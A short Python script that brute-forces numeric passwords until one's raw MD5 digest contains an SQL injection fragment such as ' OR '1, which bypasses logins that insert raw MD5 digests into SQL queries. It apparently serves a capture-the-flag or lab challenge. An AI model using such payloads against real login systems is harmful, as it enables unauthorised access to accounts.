import hashlib
import struct

def md5_raw(password):
    return hashlib.md5(password.encode()).digest()

target_strings = [
    b"' OR '1",
    b"' OR 1",
    b"'='",
    b"' OR '",
]

for i in range(10000000):
    password = str(i)
    raw = md5_raw(password)
    
    for target in target_strings:
        if target in raw:
            print(f"Found! Password: {password}")
            print(f"Raw MD5 hex: {raw.hex()}")
            print(f"Contains: {target}")
            break